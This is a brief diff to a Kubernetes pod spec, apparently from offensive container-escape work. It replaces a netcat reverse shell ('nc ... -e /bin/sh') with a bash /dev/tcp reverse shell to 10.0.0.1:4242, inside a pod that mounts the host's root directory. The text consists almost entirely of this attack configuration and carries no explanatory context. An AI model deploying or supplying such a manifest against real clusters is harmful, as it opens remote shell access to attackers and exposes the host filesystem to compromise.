@@ -43,8 +43,8 @@ spec:
   containers:
   - name: alpine
     image: localhost:5000/dev-alpine
-    command: ["/bin/sh"]
-    args: ["-c", 'nc 10.10.17.141 90 -e /bin/sh']
+    command: ["/bin/bash"]
+    args: ["-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"]
     volumeMounts:
     - mountPath: /root/
       name: mount-root-into-mnt
